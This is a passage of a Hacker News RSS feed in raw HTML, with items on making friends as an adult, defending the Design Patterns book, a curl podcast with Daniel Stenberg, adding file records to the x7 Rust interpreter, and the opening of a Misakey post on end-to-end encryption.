<p>If weâ€™re not careful, we risk living out our adulthoods friendless. This is a situation thatâ€™s worth avoiding. Friends are not only a great source of fun and <a href="https://www.pewforum.org/2018/11/20/where-americans-find-meaning-in-life/">meaning</a> in life, but studies <a href="https://academic.oup.com/psychsocgerontology/article/74/2/222/3760165">suggest</a> that, without them, weâ€™re also at greater risk of feeling more depressed. Itâ€™s telling that in their <a href="https://journals.sagepub.com/doi/10.1111/1467-9280.00415">study</a> â€˜Very Happy Peopleâ€™ (2002), the American psychologists Ed Diener and Martin Seligman found that a key difference between the most unhappy and most happy people was how socially connected they were. Friends give us so much, which is why we need to invest in making them. Hereâ€™s how.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>Making more friends in adulthood is going to take some deliberate effort on your part. Itâ€™s an exciting challenge in theory, but one of the first obstacles youâ€™ll encounter is having enough confidence. Especially if you are shy by nature, putting yourself out there can seem scary, triggering fears of rejection. These fears might lead you to engage in two types of avoidance that will inhibit your ability to make friends. First, you might practise â€˜overt avoidanceâ€™, by not putting yourself in situations where itâ€™s possible to meet new people. Instead of going to your friendâ€™s movie night, with the chance to meet others, you end up staying at home. Second, you might find yourself engaging in â€˜covert avoidanceâ€™, which means that you show up but donâ€™t engage with people when you arrive. You go to the movie night, but while everyone else is analysing the film after itâ€™s over, you stay silent in the corner, petting someoneâ€™s pet corgi and scrolling through Instagram.</p>
<p><strong>Assume that people like you</strong></p>
<p>Both these forms of avoidance are caused by understandable fears of rejection. So imagine how much easier it would be if you knew that, were you to show up in a group of strangers, most of them would love you and find you interesting. This mindset actually has a self-fulfilling quality â€“ an American <a href="https://doi.apa.org/doiLanding?doi=10.1037%2F0022-3514.51.2.284">study</a> from the 1980s found that volunteers who were led to believe that an interaction partner liked them began to act in ways that made this belief more likely to come true â€“ they shared more about themselves, disagreed less, and had a more positive attitude. This suggests that if you go into social situations with a positive mindset, assuming people like you, then itâ€™s more likely that this will actually turn out to be the case.</p>
<p>Of course, you might still be reluctant to assume others like you because you donâ€™t believe itâ€™s true. If this is you, you might take comfort from research that found, on average, that strangers like us more than we realise. The <a href="https://journals.sagepub.com/doi/10.1177/0956797618783714">paper</a>, by Erica J Boothby at Cornell University and colleagues, involved having pairs of strangers chat together for five minutes, to rate how much they liked their interaction partner, and to estimate how much their partner liked them. Across a variety of settings and study durations â€“ in the lab, in a college dorm, at a professional development workshop â€“ the same pattern emerged. People underestimated how much they were liked, a phenomenon that Boothby and her colleagues labelled â€˜the liking gapâ€™.</p>
<p>What wisdom should we take from this research? It can remind us to go into new social events assuming that people will like us. It can keep us from being paralysed by fears of rejection, pushing us to question some of these fears. Try working on your internal dialogue, your inner voice that perhaps makes overly negative assumptions about how people will respond to you. Doing this will help give you the confidence to go out there and start initiating friendly contact with strangers.</p>
<p><strong>Initiate</strong></p>
<p>In <em>We Should Get Together: The Secret to Cultivating Better Friendships</em> (2020), Kat Vellos describes being inspired to write her book after a moment of feeling utterly alone. She was looking for a friend to hang out with, so she posted on Facebook: â€˜Who wants to go eat French fries and talk about life with me?â€™ Everyone who responded lived in another state; her local San Francisco Bay Area friends were all booked up. As she put it:</p>
<blockquote>I didnâ€™t just want to eat snacks and talk about life. I was craving a different kind of life â€“ one that would give me abundant access to friends who wanted to see me as much as I wanted to see them.</blockquote>
<p>This experience made Vellos realise that she needed more friends, so she created and executed a plan to make some. Eventually, she was running two successful meetup groups, and had established friendships with people she liked and wanted to get closer to. How did she change her life? She initiated. Vellos set aside time to reach out to people regularly, to revitalise old relationships and to awaken new ones, to check in, to find time to hang out. Her story reveals how initiative can change the course of our friendships.</p>
<p>To embrace the importance of initiating, you must to let go of the myth that friendship happens organically. You have to take responsibility rather than waiting passively. Science backs this up. Consider a <a href="https://journals.sagepub.com/doi/pdf/10.1177/0265407509106718">study</a> of older adults in the Canadian province of Manitoba. The participants who thought friendship was something that just happened based on luck tended to be less socially active and to feel lonelier when the researchers caught up with them five years later. By contrast, those who thought friendship took effort actually made more effort â€“ for example, by showing up at church or at community groups â€“ and this paid dividends, in that they felt less lonely at the five-year follow-up.</p>
<p>But itâ€™s not just showing up that matters, itâ€™s saying â€˜helloâ€™ when you get there. This means introducing yourself to other people, asking them for their phone numbers, following up and asking them to hang out. Initiating is a process, one that we must do over and over again to make new friendships.</p>
<p>Initiation is particularly important for people who find themselves in new social settings â€“ such as people who have moved to a new city, started a new school or job. In a <a href="https://psycnet.apa.org/record/1987-97266-009">study</a> of first-year undergraduates at the University of Denver in 1980, it was those students who rated themselves as having superior social skills who managed to develop more satisfying social relationships. Moreover, in the Fall, when everyone was new, it was specifically â€˜initiation skillâ€™ that was most important. Once friendships were more stable, it didnâ€™t matter as much.</p>
<p>Although we might fear that other people will turn us down if we initiate with them, the research finds that this is a lot less likely than we might think. When the American psychologists Nicholas Epley and Juliana Schroeder <a href="https://psycnet.apa.org/record/2014-28833-001">asked</a> research participants to open up conversations with their fellow train commuters, can you guess how many of them were shot down? None! Epley and Schroder concluded that: â€˜Commuters appeared to think that talking to a stranger posed a meaningful risk of social rejection. As far as we can tell, it posed no risk at all.â€™</p>
<p><strong>Keep showing up</strong></p>
<p>Once youâ€™ve initiated some new contacts, the challenge of turning them into genuine friendships begins. I learned this lesson when I moved to Atlanta to start a job as assistant professor. At first, I was proactive at making friends. I showed up to events, asked my friends if they knew anyone in the area, and went to some meetup groups. I met a few people, but most of these friendships fizzled. I was good at sparking a connection but struggled to sustain it.</p>
<p>According to Rebecca G Adams, professor of sociology and gerontology at the University of North Carolina at Greensboro, sociologists have long <a href="https://www.nytimes.com/2012/07/15/fashion/the-challenge-of-making-friends-as-an-adult.html">recognised</a> that friendships thrive when we have continuous interaction. My problem with sustaining connection was that I lacked the opportunity for repeated encounters. Going to a lecture, or a happy hour, or a networking event afforded me only one opportunity to connect. If you can, itâ€™s a better idea to sign up for activities that give you multiple opportunities to connect, such as a language class, a writing course, an …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood">https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood</a></em></p>]]>
            </description>
            <link>https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515221</guid>
            <pubDate>Fri, 18 Sep 2020 10:59:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't hate the book because you don't use it]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514953">thread link</a>) | @aseure
<br/>
September 18, 2020 | https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/ | <a href="https://web.archive.org/web/*/https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
<h3>
  18 September 2020
</h3>


  <p>In a few months, I’ll celebrate my fifth year as a professional - understand paid - software engineer. I find this role to be a right balance of technical skills, human relationships and it fulfils my curiosity. As time goes by, I’m also starting to be disappointed by some of its negative aspects. While it doesn’t prevent me from sleeping, I think an effort could be made to challenge some lousy and short-sighted comments we see daily on social platforms.</p>
<p>Today, I’d like to talk about <a href="https://www.amazon.com/Design-Patterns-Object-Oriented-Addison-Wesley-Professional-ebook/dp/B000SEIBB8">Design Patterns: Elements of Reusable Object-Oriented Software</a>, a book written by Erich Gamma, Richard Helm, Ralph Johnson, and John Vlissides, famously known as the <em>Gang of Four</em>. If you never read it: this is a fundamental programming book describing programming abstractions published in 1994. The date is essential here, but we’ll come to that later.</p>
<p>This book has recently been discussed by many, due to <a href="https://twitter.com/unclebobmartin/status/1306581616983183361">a recent tweet from Robert. C. Martin aka Uncle Bob</a>. Long story short, telling a massive audience that book X is great, and treating people who consider it outdated as “foolish” does not end well.</p>
<p>While I disagree with the tone here, I’d like to focus on the negative comments which followed, including but not limited to:</p>
<ul>
<li>the book is outdated</li>
<li>its concepts are outdated</li>
<li>its authors said it’s outdated</li>
<li>the book is only focused on mid-90s C++ developers</li>
<li>no one ever used the “flyweight” design pattern</li>
<li>the book is not even readable</li>
<li>its abstractions make code unreadable</li>
</ul>
<p>First of all, let’s get back to 1994. I was two at the time. All Internet websites could probably fit on a floppy disk, Jeff Bezos founded Amazon, Rasmus Lerdorf was only starting to work on its <em>Personal Home Page/Forms Interpreter</em> CGI C program, and Larry Page and Sergey Brin would only start their research project for a web search engine two years later. The biggest technology companies were IBM, Hewlett-Packard, Motorola and Xerox, which mostly sat behind the oil, car, and food industries. Programming existed, but it wasn’t the same field as we know it today. Tech companies were a few, and I assume a lot of programmers were working in other industries. Being a professional in this sector was arguably more difficult then, and knowledge was not as easily accessible as it is today. This book was published in a world where programming started to spread in many industries. It surely was a very good resource, to try to apply its concepts, and see what works and what doesn’t. The authors were literally inventing the field at the time: Erich Gamma, for instance, teamed up with Kent Beck to create the Java JUnit test framework just a few years later, which hugely helped to popularise testing.</p>
<p>My point is: let’s remind ourselves we stand on the shoulders of many people who tried and experimented a lot at the time. We too often take for granted the knowledge and productivity we have today. On top of that, let’s not be disrespectful towards the previous generation. My father and my grandfather both work(ed) as electricians: never did my father complain about his father’s tools or habits before him. He learned them and perfected them with modern knowledge.</p>
<p>Now about the book in itself. While I agree with people saying that some design patterns are too abstract, I strongly disagree with the ones saying the whole book is outdated. Should you develop in a OO language today, such as Java, C++, Python or Ruby, or even more notably, develop a framework or a tool <em>for</em> developers, I think this book is still highly relevant today.</p>
<p>Here are my top picks from the book and why I chose them.</p>
<p><strong>Builder:</strong> because in OOP, objects often hold too much data in them, you need to control how to instantiate them properly. Even with overloaded constructors, data validation at instantiation can become messy. Do you like your testing framework using a <em>fluent interface</em> with method chaining (<code>assert(...).not().equalTo(...)</code>)? Guess what, it’s directly inspired by the builder design pattern.</p>
<p><strong>Prototype:</strong> I often hear people complaining about how complicated JavaScript is. While I don’t think this language makes it easy for the developer to write non error-prone code, I better understood the language via the lens of its prototype-based nature, precisely described by the prototype design pattern.</p>
<p><strong>Most of the structural patterns:</strong> While everyone is focused on the bad parts of OOP, namely inheritance, all those design patterns are focused on composability. If you want to be cool nowadays, you could say you prefer “composition over inheritance”. Well, if you think composition is only about embedding objects in each other, you should read the part of structural design patterns. For instance, you probably know decorators from Python or annotations in Java/C#, they derive from the decorator design pattern.</p>
<p><strong>Chain of Responsibility:</strong> I think we can all agree on how great it is to use and implement a middleware in our modern web framework. Just use or write functions which take a <em>next</em> handler, a request object. Pass it to your web framework instance via a <code>.use(...)</code> method and you’re done. This is what the Chain of Responsibility pattern is all about. All Rails, Django, and Laravel developers knew that was NIH.</p>
<p><strong>Iterator:</strong> This one seems obvious now, perhaps not so much at a time where iterating on arrays with pointer arithmetic was common. Today, iterators are even buried behind standard libraries to implement even higher abstract functionalities, but they are still there. I don’t see a more universal way to implement, with the same public API, a traversal of an array, a tree, or a graph (they are better ways of iterating those last data structures though).</p>
<p><strong>Observer:</strong> For this last one, here is the verbatim definition from the book: “Define a one-to-many dependency between objects so that when one object changes state, all its dependents are notified and updated automatically”. Now, if we take a look at some modern technologies, doesn’t this resonate with PubSub models or React hooks for instance?</p>
<p>To conclude, I’m not saying the book is not old, quite the opposite: you can feel it when it takes as examples from 90s user interfaces. I’m merely advocating that our industry and its workers have changed a lot in the last 30 years, dare I say even more than in any other industry. But this should not be an excuse to sweep away years of meticulous R&amp;D and documentation, on which our modern tools still rely on nowadays, and the people behind it.</p>
<p>Because a lot of people complained that they were never able to finish the book, here is an extract from the end, section “What to Expect from Design Patterns”, page 351:</p>
<blockquote>
<p>It’s possible to argue that this book hasn’t accomplished much. After all, it doesn’t present any algorithms or programming techniques that haven’t been used before. […] it just documents existing designs. You could conclude that it makes a reasonable tutorial, perhaps, but it certainly can’t offer much to an experienced object-oriented designer.</p>
<p>We hope you think differently. Cataloging design patterns is important. It gives us standard names and definitions for the techniques we use. If we don’t study design patterns in software, we won’t be able to improve them, and it’ll be harder to come up with new ones.</p>
<p>This book is only a start.</p>
</blockquote>

</div></div>]]>
            </description>
            <link>https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514953</guid>
            <pubDate>Fri, 18 Sep 2020 10:14:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Security Headlines: cURL special with Daniel Stenberg [audio]]]>
            </title>
            <description>
<![CDATA[
Score 37 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514932">thread link</a>) | @devrustr
<br/>
September 18, 2020 | https://blog.firosolutions.com/2020/09/security-headlines-curl-special/ | <a href="https://web.archive.org/web/*/https://blog.firosolutions.com/2020/09/security-headlines-curl-special/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  





<p><img alt="curl security headlines podcast" src="https://blog.firosolutions.com/shcurl.png"></p><h3 id="summary">Summary:</h3>

<p>In this episode of Security Headlines, we jump into curl with<br>
its founder and maintainer Daniel Stenberg.<br>
We talk security, CI systems, creation of curl, Fuzzing, IRC bots<br>
and a lot more!</p>

<p>Relax, Tune in and enjoy this episode of Security Headlines:</p>







<p><a href="https://anchor.fm/firo-solutions/episodes/Curl-special-with-Daniel-Stenberg-ejqn0g">https://anchor.fm/firo-solutions/episodes/Curl-special-with-Daniel-Stenberg-ejqn0g</a></p>

<p>Few software developers never even get near to having one<br>
of their projects being picked up by a larger community.</p>

<p>A project that started as a currency plugin to an IRC bot.<br>
Spun off and ended up becoming bigger and bigger resulting in being
adopted by over 10 billion devices.  Well, this project is called<br>
curl!  Curl is known to be the stable swizz army knife that can<br>
be used for making various types of transfer requests.</p>

<p>Need to download a file? Curl is here for you<br>
Need to test a socks5 proxy? Curl is here for you<br>
Need to download an ezine over Gopher? Curl is here for you<br>
Need to test a unix socket? Curl is here for you</p>

<p>In this episode of Security Headlines, we are joined by Daniel<br>
Stenberg who is the founder and maintainer of Curl.<br>
He has even been awarded a gold medal by the Swedish king for<br>
his work with Curl.</p>



<p><img alt="curl Daniel stenberg King medal" src="https://blog.firosolutions.com/daniel-king.jpg"></p><p>The curl codebase is around 100 000 lines of C code, filled with<br>
hidden gems such as a libcurl code generator that creates a template<br>
based on the command line arguments you give it.</p>

<p>One of curl’s many features is the –libcurl option which<br>
takes the commmand you give curl and generate a C program that use<br>
libcurl with the same functionally, you can even port it to other<br>
programming languages with a similar syntax and use it with libcurl’s<br>
bindings.</p>

<pre><code>$ curl https://blog.firosolutions.com --libcurl example.c   
$ head example.c 
/********* Sample code generated by the curl command line tool **********
 * All curl_easy_setopt() options are documented at:
 * https://curl.haxx.se/libcurl/c/curl_easy_setopt.html
 ************************************************************************/
#include &lt;curl/curl.h&gt;

int main(int argc, char *argv[])
{
  CURLcode ret;
  CURL *hnd;

</code></pre>

<p>Even Google love Curl, having curl in over 100 devices.<br>
This leads us to Google’s fuzzing project, where they have<br>
an army of computers that feed automated generated data in order<br>
to find bugs.<br>
This has resulted in curl being more stable, secure, and mature.</p>

<p>The world is always moving and so is the technology evolution.<br>
Getting a bit dystopian here, but maybe we will move to a future<br>
where we are running everything in a browser.<br>
A world where everything runs ipv6 and http3.</p>

<p>In that world, I know one tool we can count on.</p>

<h3 id="external-links">External links:</h3>

<p><a href="https://curl.haxx.se/">https://curl.haxx.se/</a><br>
<a href="https://curl.haxx.se/docs/security.html">https://curl.haxx.se/docs/security.html</a><br>
<a href="https://en.wikipedia.org/wiki/CURL">https://en.wikipedia.org/wiki/CURL</a><br>
<a href="https://twitter.com/bagder">https://twitter.com/bagder</a><br>
<a href="https://www.wolfssl.com/">https://www.wolfssl.com/</a><br>
<a href="https://daniel.haxx.se/">https://daniel.haxx.se/</a><br>
<a href="https://bugs.chromium.org/p/oss-fuzz/issues/list?sort=-opened&amp;can=1&amp;q=proj:curl">https://bugs.chromium.org/p/oss-fuzz/issues/list?sort=-opened&amp;can=1&amp;q=proj:curl</a><br>
<a href="https://en.wikipedia.org/wiki/Gopher_%28protocol%29">https://en.wikipedia.org/wiki/Gopher_%28protocol%29</a><br>
<a href="https://curl.haxx.se/mail/">https://curl.haxx.se/mail/</a></p>

</div></div>]]>
            </description>
            <link>https://blog.firosolutions.com/2020/09/security-headlines-curl-special/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514932</guid>
            <pubDate>Fri, 18 Sep 2020 10:10:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing Records in X7]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514658">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://dpbriggs.ca/blog/Implementing-Method-Calls-In-x7 | <a href="https://web.archive.org/web/*/https://dpbriggs.ca/blog/Implementing-Method-Calls-In-x7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="text-org2fd690a">
<p>
The original motivation for adding <code>Record</code> to <code>x7</code> is the ability to open, read, and write to files.
We'll back the <code>x7</code> File implementation by the <code>rust</code> File struct, so let's make a new file in <code>x7</code> - <code>records/file.rs</code>:
</p>
<p>
We will start by making a <code>FileRecord</code> struct:
</p>
<div>
<pre><span>#</span><span>[</span><span>derive</span><span>(</span><span>Clone, Debug</span><span>)</span><span>]</span>
<span>pub</span><span>(</span><span>crate</span><span>)</span> <span>struct</span> <span>FileRecord</span> <span>{</span>
    <span>path</span>: <span>String</span>,
    <span>// </span><span>The Record trait requires Sync + Send</span>
    <span>file</span>: <span>Arc</span><span>&lt;</span><span>Mutex</span><span>&lt;</span><span>std</span>::<span>fs</span>::<span>File</span><span>&gt;</span><span>&gt;</span>,
<span>}</span>
</pre>
</div>
<p>
The type <code>Arc&lt;Mutex&lt;std::fs::File&gt;&gt;</code> is necessary as <code>x7</code> requires all types to be thread safe.
</p>
<p>
Now that we have a struct, let's expose a way to generate one from <code>x7</code>. We want the following <code>x7</code> expression to work:
</p>

<p>
This will map to a <code>Expr::String("file-name")</code> in the interpreter, so we need two methods:
</p>
<ol>
<li>A way to open files given a <code>String</code></li>
<li>A way to open files given an <code>Expr::String</code></li>
</ol>
<p>
With that in mind, here's the two relevant methods:
</p>
<div>
<pre><span>impl</span> <span>FileRecord</span> <span>{</span>
      <span>/// Open a file with the given Path</span>
      <span>pub</span><span>(</span><span>crate</span><span>)</span> <span>fn</span> <span>open_file</span><span>(</span><span>path</span>: <span>String</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>// </span><span>Open the file with liberal permissions.</span>
      <span>let</span> <span>f</span> = <span>OpenOptions</span>::new<span>()</span>
          .write<span>(</span><span>true</span><span>)</span>
          .create<span>(</span><span>true</span><span>)</span>
          .read<span>(</span><span>true</span><span>)</span>
          .open<span>(</span>path.clone<span>()</span><span>)</span>
          .map_err<span>(</span>|e| <span>anyhow!</span><span>(</span><span>"Could not open file \"{}\" because {}"</span>, &amp;path, e<span>)</span><span>)</span><span>?</span>;
      <span>// </span><span>Make the path pretty.</span>
      <span>let</span> <span>abs_path</span> = <span>fs</span>::canonicalize<span>(</span>path<span>)</span>
          .map_err<span>(</span>|e| <span>anyhow!</span><span>(</span><span>"Could not canonicalize path! {}"</span>, e<span>)</span><span>)</span><span>?</span>
          .to_str<span>()</span>
          .ok_or_else<span>(</span>|| <span>anyhow!</span><span>(</span><span>"Could not represent path as UTF-8 string"</span><span>)</span><span>)</span><span>?</span>
          .into<span>()</span>;
      <span>// </span><span>record! is a macro to assist in making LispResult&lt;Expr::Record&gt; types</span>
      <span>record!</span><span>(</span><span>FileRecord</span>::new<span>(</span>f, abs_path<span>)</span><span>)</span>
  <span>}</span>

  <span>/// Open a file from x7</span>
  <span>/// This function signature will let us expose it directly to the interpreter</span>
  <span>pub</span><span>(</span><span>crate</span><span>)</span> <span>fn</span> <span>from_x7</span><span>(</span><span>exprs</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span>, <span>_symbol_table</span>: &amp;<span>SymbolTable</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>exact_len!</span><span>(</span>exprs, <span>1</span><span>)</span>;
      <span>let</span> <span>path</span> = exprs<span>[</span><span>0</span><span>]</span>.get_string<span>()</span><span>?</span>;
      <span>FileRecord</span>::open_file<span>(</span>path<span>)</span>
  <span>}</span>
<span>}</span>
</pre>
</div>
<p>
Now that we have the ability to make a <code>FileRecord</code>, we'll need to implement <code>Record</code>
so it can be understood by the interpreter (<code>Expr::Record</code>).
</p>
<div>
<pre><span>impl</span> <span>Record</span> <span>for</span> <span>FileRecord</span> <span>{</span>
    <span>fn</span> <span>call_method</span><span>(</span>&amp;<span>self</span>, <span>sym</span>: &amp;<span>str</span>, <span>args</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>// </span><span>We have no methods yet.</span>
      <span>unknown_method!</span><span>(</span><span>self</span>, sym<span>)</span>
    <span>}</span>

    <span>fn</span> <span>type_name</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; &amp;'<span>static</span> <span>str</span> <span>{</span>
        <span>"FileRecord"</span>
    <span>}</span>

    <span>fn</span> <span>display</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>String</span> <span>{</span>
        <span>format!</span><span>(</span><span>"File&lt;</span><span>{}</span><span>&gt;"</span>, <span>self</span>.path<span>)</span>
    <span>}</span>

    <span>fn</span> <span>debug</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>String</span> <span>{</span>
        <span>self</span>.display<span>()</span>
    <span>}</span>

    <span>fn</span> <span>clone</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>RecordType</span> <span>{</span>
        <span>Box</span>::new<span>(</span><span>Clone</span>::clone<span>(</span><span>self</span><span>)</span><span>)</span>
    <span>}</span>

    <span>fn</span> <span>methods</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>Vec</span><span>&lt;</span>&amp;'<span>static</span> <span>str</span><span>&gt;</span> <span>{</span>
        <span>Vec</span>::new<span>()</span>
    <span>}</span>

    <span>fn</span> <span>id</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>u64</span> <span>{</span>
        <span>use</span> <span>std</span>::<span>collections</span>::<span>hash_map</span>::<span>DefaultHasher</span>;
        <span>use</span> <span>std</span>::<span>hash</span>::<span>{</span><span>Hash</span>, <span>Hasher</span><span>}</span>;
        <span>let</span> <span>mut</span> <span>h</span> = <span>DefaultHasher</span>::new<span>()</span>;
        <span>self</span>.path.hash<span>(</span>&amp;<span>mut</span> h<span>)</span>;
        h.finish<span>()</span>
    <span>}</span>
<span>}</span>
</pre>
</div>
<p>
We also need to expose <code>FileRecord::from_x7</code> to the interpreter, so let's head back and add it to <code>make_stdlib_fns</code>:
</p>
<div>
<pre> <span>make_stdlib_fns!</span><span>{</span>
  <span>// </span><span>elided functions...</span>
  <span>(</span><span>"call_method"</span>, <span>2</span>, call_method, <span>true</span>, <span>"&lt;doc-string&gt;"</span><span>)</span>,
  <span>// </span><span>Open a file</span>
  <span>(</span><span>"fs::open"</span>, <span>1</span>, <span>FileRecord</span>::from_x7, <span>true</span>, <span>"Open a file."</span><span>)</span>,
<span>}</span>
</pre>
</div>
<p>
We can now compile and run <code>x7</code> to see what happens:
</p>
<div>
<pre>&gt;&gt;&gt; <span>(</span>def f <span>(</span>fs::open <span>"hello-world.txt"</span><span>)</span><span>)</span>
nil
&gt;&gt;&gt; f
File&lt;/home/david/programming/x7/hello-world.txt&gt;
</pre>
</div>
<p>
Nice! We've opened a file. We can now implement some other useful methods on <code>FileRecord</code> like reading from a file:
</p>
<div>
<pre><span>impl</span> <span>FileRecord</span> <span>{</span>
  <span>/// Read the contents of a file to a String,</span>
  <span>/// rewinding the cursor to the front.</span>
  <span>fn</span> <span>read_all</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>String</span><span>&gt;</span> <span>{</span>
      <span>let</span> <span>mut</span> <span>buf</span> = <span>String</span>::new<span>()</span>;
      <span>let</span> <span>mut</span> <span>guard</span> = <span>self</span>.file.lock<span>()</span>;
      guard
          .read_to_string<span>(</span>&amp;<span>mut</span> buf<span>)</span>
          .map_err<span>(</span>|e| <span>anyhow!</span><span>(</span><span>"Failed to read to string {}"</span>, e<span>)</span><span>)</span><span>?</span>;
      <span>rewind_file!</span><span>(</span>guard<span>)</span>;
      <span>Ok</span><span>(</span>buf<span>)</span>
  <span>}</span>

  <span>/// Read the contents of a FileRecord to a string.</span>
  <span>fn</span> <span>read_to_string</span><span>(</span>&amp;<span>self</span>, <span>args</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>// </span><span>We want no arguments.</span>
      <span>exact_len!</span><span>(</span>args, <span>0</span><span>)</span>;
      <span>self</span>.read_all<span>()</span>.map<span>(</span><span>Expr</span>::<span>String</span><span>)</span>
  <span>}</span>
<span>}</span>
</pre>
</div>
<p>
We can update our <code>Record</code> implementation for <code>FileRecord</code> to include this method:
</p>
<div>
<pre><span>impl</span> <span>Record</span> <span>for</span> <span>FileRecord</span> <span>{</span>
    <span>fn</span> <span>call_method</span><span>(</span>&amp;<span>self</span>, <span>sym</span>: &amp;<span>str</span>, <span>args</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
        <span>match</span> sym <span>{</span>
            <span>"read_to_string"</span> =&gt; <span>self</span>.read_to_string<span>(</span>args<span>)</span>,
            _ =&gt; <span>unknown_method!</span><span>(</span><span>self</span>, sym<span>)</span>,
        <span>}</span>
    <span>}</span>
<span>}</span>
</pre>
</div>
<p>
And use it:
</p>
<div>
<pre>~ echo <span>"hello"</span> &gt; hello-world.txt
~ x7
&gt;&gt;&gt; <span>(</span>def f <span>(</span>fs::open <span>"hello-world.txt"</span><span>)</span><span>)</span>
&gt;&gt;&gt; <span>(</span>call_method f <span>"read_to_string"</span><span>)</span>
<span>"hello"</span>
</pre>
</div>
<p>
Awesome! We're able to call methods on <code>FileRecord</code>. It's the same process to implement <code>.write</code> and other useful file operations, so we'll elide it. This is great stuff, and would be even better with some syntactic sugar.
</p>
<p>
Let's add method call syntax so these two expressions are equal:
</p>
<div>
<pre>&gt;&gt;&gt; <span>(</span>call_method f <span>"read_to_string"</span><span>)</span>
&gt;&gt;&gt; <span>(</span>.read_to_string f<span>)</span>
</pre>
</div>
</div></div>]]>
            </description>
            <link>https://dpbriggs.ca/blog/Implementing-Method-Calls-In-x7</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514658</guid>
            <pubDate>Fri, 18 Sep 2020 09:19:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Year and a Half of End-to-End Encryption at Misakey]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514370">thread link</a>) | @cedricvanrompay
<br/>
September 18, 2020 | https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric | <a href="https://web.archive.org/web/*/https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <article>
      

<p>A journey through some of the reasonings and technical challenges that I had so far as a software developer at Misakey specialized in cryptography and security.</p>

<h2 id="how-i-got-here">How I Got Here</h2>
<p>I was recruited by Misakey shortly after its first fundraising (February 2019, €1M). The mission of Misakey was, and still is as of today, to provide an easy-to-use and highly secure way to connect people to the numerous accounts they have on other websites, as well as to connect people between each other. One key element of the solution was to encrypt user data in an <em>end-to-end</em> fashion, meaning that, while the data exchanged by users and websites would flow through our servers, it would be encrypted with a key that Misakey does not have. Doing so greatly increases the security of user’s data, but it adds a lot of technical challenges.</p>
<p><em>“Do not roll your own crypto”</em>: this adage is a reminder to software developers that cryptography is a very tricky discipline. Trying to build your own cryptography without a high degree of knowledge in this field is a sure way to introduce a security vulnerability in your product. Instead, you should rely entirely on third-party tools and services when it comes to cryptography, and you should avoid using them in a “creative” way.</p>
<p>At Misakey, we try to follow this principle as much as possible. For instance, we do TLS<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> in the most standard, boring, uncreative way. But end-to-end encryption is still quite a “bleeding-edge” technology, and as a result you are not sure to find a tool that perfectly fits your needs. In this situation, there are two sane things to do: giving up, or investing massively in cryptographic expertise.</p>
<p>The founders of Misakey went for the second option. Unfortunately, professional software developers with a high expertise in cryptography are pretty rare. So they went for the opposite approach: they started looking for an expert in cryptography that would have decent skills in software development.</p>
<p>At that time, I had recently finished my PhD on cryptography and secure protocols after graduating as an engineer from <a href="https://www.telecom-paris.fr/">Télécom Paris</a> and <a href="https://www.eurecom.fr/fr">EURECOM</a>. Although I had never worked as a professional software developer, I had been programming as a hobbyist since the age of 15, and the engineering schools I graduated from are quite specialized in I.T. After a few discussions on the phone with the founders, I was hired. The deal was that I would progressively become a professional software developer in his own right by programming with the rest of the team, while using my knowledge of cryptography to design and implement the protocols Misakey needs. I also had some training in general cyber security (“hacking”, sort of), so I would be quite active on this topic as well<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</p>
